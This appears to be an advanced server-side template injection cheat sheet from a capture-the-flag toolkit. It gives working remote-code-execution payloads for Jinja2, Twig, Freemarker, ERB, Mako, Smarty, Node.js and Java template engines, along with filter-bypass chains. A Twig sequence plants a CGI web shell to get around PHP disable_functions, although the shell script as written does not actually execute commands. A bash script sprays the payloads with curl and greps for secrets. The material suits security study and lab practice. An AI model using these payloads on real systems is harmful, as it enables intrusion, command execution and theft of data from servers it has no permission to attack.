# SSTI — Advanced

This file: dense reference for engine-specific RCE chains and filter bypasses. Quick reference in `ssti-quickstart.md`.

## Polyglot detection

```
${{<%[%'"}}%\
```

If processed (rather than echoed verbatim) → engine present. Confirm with engine-specific math test.

## Engine math probes & Node.js / Java engines

```
{{7*7}}=49: Jinja2/Twig/Smarty/Liquid    ${7*7}=49: Freemarker/Velocity/SpEL
<%=7*7%>=49: ERB                          ${{7*7}}=49: SpEL
#{7*7}=49: Ruby ERB / Spring              *{7*7}=49: Spring/OGNL
@{7*7}=49: Thymeleaf                       {7*7}=literal: Mustache

EJS:        <%= require('child_process').execSync('id').toString() %>
Nunjucks:   {{range.constructor("return require('child_process').execSync('id').toString()")()}}
Pug:        - var p=global.process / = p.mainModule.require('child_process').execSync('id')
Dot.js:     {{=require('child_process').execSync('id').toString()}}
Handlebars: long lookup-chain (constructor/split/each) — see ssti-cheat-sheet.md

JSP EL:     ${''.getClass().forName('java.lang.Runtime').getMethod('exec',[Ljava.lang.String;).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),new String[]{'id'})}
Thymeleaf:  __${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
SpEL:       ${T(java.lang.Runtime).getRuntime().exec("id")}
            #{T(java.lang.Runtime).getRuntime().exec("id")}
```

## Optimized RCE (per engine)

### Jinja2 — MRO traversal

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}                 # enumerate
{{ ''.__class__.__mro__[1].__subclasses__()[X]('cat /flag',shell=True,stdout=-1).communicate() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}        # short
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('ls /').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
```

### Jinja2 heavy filter bypass (no `_`, `'`, `"`, `[`, `]`, hex blocked)

```python
# Use {%print%} instead of {{}} when double-brace blocked
# Use |attr() for attribute access without dots/brackets
# Build '__class__' via format(): '%c%cclass%c%c'|format(95,95,95,95)

# RCE chain smuggling blocked strings via request params:
{%print lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()%}
# URL: ?a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read

# Build underscore via format:
{%set u='%c'|format(95)%}{%set cc=u~u~'class'~u~u%}{%print ''|attr(cc)%}
```

### Twig — registerUndefinedFilterCallback

```php
# Twig 1.x
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

# Twig 2.x / 3.x
{{['cat /flag']|filter('system')}}
{{['cat /flag']|map('system')}}
{{['cat /flag']|sort('system')}}
{{['cat /flag']|reduce('system')}}
```

### Twig SSTI to RCE — bypassing `disable_functions` / `open_basedir`

When PHP `disable_functions` blocks `system/exec/passthru/shell_exec/popen` and `open_basedir` restricts file access — use `sort()` callback with file functions NOT in disable_functions:

```php
# 1. Write CGI shell + .htaccess via file_put_contents (not in disable_functions)
{{['Options +ExecCGI\nAddHandler cgi-script .cgi','/var/www/html/.htaccess']|sort('file_put_contents')}}
{{['#!/bin/bash\necho Content-Type: text/plain\necho\n','/var/www/html/cmd.cgi']|sort('file_put_contents')}}

# 2. Make CGI executable via chmod
{{['/var/www/html/cmd.cgi',0755]|sort('chmod')}}

# 3. Access /cmd.cgi?id
```

Key insight: `sort()`/`filter()`/`map()`/`reduce()` accept a callable. `file_put_contents`/`chmod`/`rename`/`copy` are often NOT in disable_functions.

### Freemarker — Execute / ObjectConstructor

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}

<#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
<#assign rt=oc("java.lang.ProcessBuilder", ["cat", "/flag"])>
${rt.start().inputStream.text}
```

### ERB — Quick RCE

```ruby
<%= `cat /flag` %>
<%= system("cat /flag") %>
<%= IO.popen("cat /flag").read %>
<%= File.read("/flag") %>
```

### Mako (Python)

```python
${__import__('os').popen('cat /flag').read()}
```

### Smarty (PHP)

```php
{system('cat /flag')}
{passthru('cat /flag')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('cat /flag'); ?>",self::clearConfig())}
```

## Quick flag finder (multi-engine)

```bash
#!/bin/bash
URL="$1"; PARAM="$2"
PAYLOADS=(
  "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
  "{{cycler.__init__.__globals__.os.popen('cat /flag*').read()}}"
  "<%25=%20\`cat%20/flag*\`%20%25>"
  "<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"cat /flag*\")}"
  "<%25=%20require('child_process').execSync('cat /flag*').toString()%20%25>"
  "{{range.constructor(\"return require('child_process').execSync('cat /flag*').toString()\")()}}"
  "{%25%20import%20os%20%25}{{os.popen('cat /flag*').read()}}"
  "{{['cat /flag*']|filter('system')}}"
)
for p in "${PAYLOADS[@]}"; do
  RESP=$(curl -s "$URL?$PARAM=$p")
  if echo "$RESP" | grep -qiE "root:|uid=|secret|token|password"; then
    echo "[+] RCE: $RESP" | head -20; break
  fi
done
```

## Auto-detect

```python
def detect_engine(url, param):
    probes = {'Jinja2/Twig':('{{7*7}}','49'),'Freemarker/SpEL':('${7*7}','49'),
              'ERB':('<%=7*7%>','49'),'Mustache':('{{7*7}}','7*7')}
    return [e for e,(p,exp) in probes.items() if exp in requests.get(url,params={param:p}).text]
```

## References

`ssti-quickstart.md`, `ssti-cheat-sheet.md`, `ssti-resources.md`. PortSwigger / HackTricks SSTI labs.
